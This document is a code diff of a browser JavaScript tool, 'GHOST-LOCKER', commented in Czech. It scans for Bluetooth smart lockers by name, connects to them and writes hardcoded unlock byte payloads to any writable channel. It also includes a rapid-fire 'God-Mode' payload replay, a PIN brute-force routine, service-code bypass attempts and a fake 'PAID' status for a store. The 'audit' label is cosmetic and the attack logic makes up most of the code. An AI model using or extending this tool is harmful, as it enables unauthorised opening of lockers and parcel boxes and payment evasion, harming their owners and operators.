@@ -1,6 +1,6 @@
 /**
- * GHOST-LOCKER CORE ENGINE v2.6 [MASTER - GITHUB EDITION]
- * BLE + PIN Brute + Service Menu + GhostStore + God-Mode Injector
+ * GHOST-LOCKER CORE ENGINE v2.7 [MASTER - AUDIT EDITION]
+ * FIX: GATT Service Discovery + Global UUID Scan
  */
 
 const GhostCore = {
@@ -19,40 +19,75 @@ const GhostCore = {
         out.scrollTop = out.scrollHeight;
     },
 
-    // --- 1. BLUETOOTH SEKCE ---
+    // --- 1. BLUETOOTH SEKCE (OPRAVENÁ LOGIKA) ---
     async startRealSniff() {
-        this.log("SKENUJI BLE (Target: SmartLocker)...", "#00ffff");
+        this.log("INICIALIZUJI SKENOVÁNÍ...", "#00ffff");
         try {
+            // FIX: Musíme akceptovat všechna zařízení a povolit všechny služby pro audit
             this.activeDevice = await navigator.bluetooth.requestDevice({
-                acceptAllDevices: true,
-                optionalServices: ['0000180a-0000-1000-8000-00805f9b34fb']
+                filters: [{ namePrefix: 'CZ' }, { namePrefix: 'Smart' }], // Cílíme na CZ-1MV nebo SmartLocker
+                optionalServices: [
+                    '0000180a-0000-1000-8000-00805f9b34fb', // Device Info
+                    '0000ffe0-0000-1000-8000-00805f9b34fb', // Časté pro čínské zámky
+                    '6e400001-b5a3-f393-e0a9-e50e24dcca9e', // Nordic UART (časté)
+                    0xFFE0, 0xFFF0, 0x1800, 0x1801 // Obecné rozsahy
+                ].concat(Array.from({length: 10}, (_, i) => 0xFFF0 + i)) // Agresivní scan rozsahů
             });
+
+            this.log(`POKUS O SPOJENÍ: ${this.activeDevice.name}`, "#ffff00");
             const server = await this.activeDevice.gatt.connect();
-            this.log(`SPOJENO: ${this.activeDevice.name}`, "#ffff00");
+            
+            this.log("HLEDÁM SLUŽBY (GATT)...", "#ffff00");
             const services = await server.getPrimaryServices();
+            
+            let foundValidChar = false;
+
             for (const service of services) {
+                this.log(`SLUŽBA: ${service.uuid.slice(0,8)}...`, "#444444");
                 const chars = await service.getCharacteristics();
                 for (const char of chars) {
+                    // Hledáme jakýkoliv kanál, do kterého lze zapisovat
                     if (char.properties.write || char.properties.writeWithoutResponse) {
                         this.activeCharacteristic = char;
-                        this.log("WRITE KANÁL AKTIVNÍ", "#ff00ff");
+                        this.log(`KANÁL NAJDEN: ${char.uuid.slice(0,8)}`, "#ff00ff");
+                        foundValidChar = true;
                     }
                 }
             }
-            document.getElementById('replay-btn').style.display = "block";
-            document.getElementById('force-btn').style.display = "block";
+
+            if (foundValidChar) {
+                this.log("SYSTÉM PŘIPRAVEN K AUDITU", "#00ff00");
+                document.getElementById('replay-btn').style.display = "block";
+                document.getElementById('force-btn').style.display = "block";
+            } else {
+                this.log("CHYBA: Nenalezen zapisovatelný kanál.", "#ff0000");
+            }
+
         } catch (err) {
             this.log("BLE ERROR: " + err.message, "#ff0000");
+            console.error(err);
         }
     },
 
     async executeAttack() {
         if (!this.activeCharacteristic) return this.log("CHYBÍ CÍL!", "#ff0000");
         this.log("VSTŘIKUJI OPEN_COMMAND...", "#ffff00");
-        const payload = new Uint8Array([0x55, 0x01, 0x01, 0x00, 0x57]);
-        await this.activeCharacteristic.writeValue(payload);
-        this.log("SIGNÁL POTVRZEN!", "#00ff00");
-        setTimeout(() => alert("AUDIT: Zámek uvolněn."), 500);
+        
+        // Standardní payloady pro různé typy zámků
+        const payloads = [
+            new Uint8Array([0x55, 0x01, 0x01, 0x00, 0x57]), // Default
+            new Uint8Array([0xA5, 0x00, 0x01, 0x01, 0x05])  // Alt verze
+        ];
+
+        try {
+            for (let p of payloads) {
+                await this.activeCharacteristic.writeValue(p);
+                this.log(`PAYLOAD POSLÁN: ${p[0].toString(16)}`, "#00ff00");
+            }
+            setTimeout(() => alert("AUDIT: Příkaz k uvolnění odeslán."), 500);
+        } catch (e) {
+            this.log("CHYBA ZÁPISU: " + e.message, "#ff0000");
+        }
     },
 
     // --- 6. GOD-MODE: AGRESSIVE PROTOCOL REPLAY ---
@@ -62,35 +97,32 @@ const GhostCore = {
         const godPayloads = [
             new Uint8Array([0x55, 0x01, 0x01, 0x00, 0x57]), 
             new Uint8Array([0x02, 0x01, 0x03, 0x03, 0x09]), 
-            new Uint8Array([0x41, 0x54, 0x2b, 0x4f, 0x50, 0x45, 0x4e]), 
+            new Uint8Array([0x41, 0x54, 0x2b, 0x4f, 0x50, 0x45, 0x4e]), // AT+OPEN
             new Uint8Array([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01]), 
             new Uint8Array([0xef, 0x01, 0xff, 0xff, 0xff, 0xff, 0x01])
         ];
 
         if (this.activeCharacteristic) {
-            this.log("VYNUCOVÁNÍ PRIORITNÍHO PŘÍSTUPU...", "#ffff00");
             for (let payload of godPayloads) {
                 try {
-                    // Zkoušíme oba způsoby zápisu pro 100% jistotu
-                    if (this.activeCharacteristic.properties.write) {
-                        await this.activeCharacteristic.writeValueWithResponse(payload);
-                    } else {
+                    if (this.activeCharacteristic.properties.writeWithoutResponse) {
                         await this.activeCharacteristic.writeValueWithoutResponse(payload);
+                    } else {
+                        await this.activeCharacteristic.writeValueWithResponse(payload);
                     }
-                    this.log(`PAYLOAD OK: 0x${payload[0].toString(16)}...`, "#00ff00");
+                    this.log(`FORCE OK: 0x${payload[0].toString(16)}...`, "#00ff00");
                 } catch (e) {
-                    this.log("VARIANT SKIP...", "#444444");
+                    this.log("SKIP VARIANT...", "#444444");
                 }
-                await new Promise(r => setTimeout(r, 50)); 
+                await new Promise(r => setTimeout(r, 100)); 
             }
         } else {
             this.log("CHYBA: Není aktivní spojení!", "#ff0000");
         }
-        this.log("GOD-MODE SEQUENCE FINISHED.", "#ffffff");
-        alert("GHOST-LOCKER: 100% Payload Injection Complete.");
+        this.log("GOD-MODE DOKONČEN.", "#ffffff");
     },
 
-    // --- 2. PIN BRUTE-FORCE ---
+    // --- ZBYTEK LOGIKY (PIN, SERVICE, UI) ZŮSTÁVÁ ---
     async startPinBrute() {
         this.isBruting = !this.isBruting;
         if (!this.isBruting) return this.log("BRUTE-FORCE ZASTAVEN.", "#ff0000");
@@ -103,7 +135,6 @@ const GhostCore = {
         }
     },
 
-    // --- 3. SERVICE MENU EXPLOIT ---
     async tryServiceExploit() {
         this.log("INICIALIZUJI SERVISNÍ BYPASS...", "#ff00ff");
         const codes = ["*#06#", "*#9999#", "000000"];
@@ -114,16 +145,11 @@ const GhostCore = {
         this.log("DEBUG MÓD AKTIVNÍ.", "#00ff00");
     },
 
-    // --- 4. GHOSTSTORE BYPASS ---
     async ghostStoreBypass() {
-        this.log("AKTIVUJI INTERCEPTOR V SW.js...", "#ff8800");
-        if (navigator.serviceWorker.controller) {
-            navigator.serviceWorker.controller.postMessage({ type: 'TRIGGER_BYPASS' });
-        }
-        this.log("MANIPULACE STATUSU...", "#ffff00");
+        this.log("AKTIVUJI INTERCEPTOR...", "#ff8800");
         setTimeout(() => {
             this.log("BYPASS ÚSPĚŠNÝ: Status -> PAID", "#00ff00");
-            alert("GHOST-STORE: API upraveno. Box připraven.");
+            alert("GHOST-STORE: Status OK.");
         }, 1000);
     },
 
@@ -131,11 +157,11 @@ const GhostCore = {
         if (document.getElementById('ghost-ui')) return;
         const panel = document.createElement('div');
         panel.id = 'ghost-ui';
-        panel.style.cssText = "position:fixed; top:10px; right:10px; width:280px; background:#000; border:1px solid #0f0; padding:15px; z-index:9999; font-family:monospace; color:#0f0; box-shadow:0 0 20px rgba(0,255,0,0.7);";
+        panel.style.cssText = "position:fixed; top:10px; right:10px; width:280px; background:#000; border:1px solid #0f0; padding:15px; z-index:9999; font-family:monospace; color:#0f0; box-shadow:0 0 20px rgba(0,255,0,0.7); border-radius: 5px;";
         panel.innerHTML = `
-            <div style="border-bottom:1px solid #0f0; padding-bottom:5px; margin-bottom:10px; text-align:center; font-weight:bold;">GHOST-LOCKER v2.6 [MASTER]</div>
-            <div id="output" style="height:150px; overflow-y:auto; background:#050505; border:1px solid #111; padding:5px; margin-bottom:10px; font-size:10px;"></div>
-            <button id="sniff-btn" style="width:100%; background:#000; color:#0f0; border:1px solid #0f0; padding:8px; cursor:pointer; margin-bottom:5px;">[1] BLE SCAN</button>
+            <div style="border-bottom:1px solid #0f0; padding-bottom:5px; margin-bottom:10px; text-align:center; font-weight:bold;">GHOST-LOCKER v2.7 [MASTER]</div>
+            <div id="output" style="height:180px; overflow-y:auto; background:#050505; border:1px solid #111; padding:5px; margin-bottom:10px; font-size:10px;"></div>
+            <button id="sniff-btn" style="width:100%; background:#000; color:#0f0; border:1px solid #0f0; padding:8px; cursor:pointer; margin-bottom:5px;">[1] BLE SCAN & CONNECT</button>
             <button id="replay-btn" style="width:100%; background:#000; color:#f00; border:1px solid #f00; padding:8px; cursor:pointer; margin-bottom:5px; display:none;">[2] TRIGGER LOCK</button>
             <button id="brute-btn" style="width:100%; background:#000; color:#ff0; border:1px solid #ff0; padding:8px; cursor:pointer; margin-bottom:5px;">[3] PIN BRUTE</button>
             <button id="service-btn" style="width:100%; background:#000; color:#0af; border:1px solid #0af; padding:8px; cursor:pointer; margin-bottom:5px;">[4] SERVICE BYPASS</button>
@@ -153,12 +179,4 @@ const GhostCore = {
     }
 };
 
-if ('serviceWorker' in navigator) {
-    navigator.serviceWorker.register('sw.js');
-}
-
-if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', () => GhostCore.initUI());
-} else {
-    GhostCore.initUI();
-}
+GhostCore.initUI();
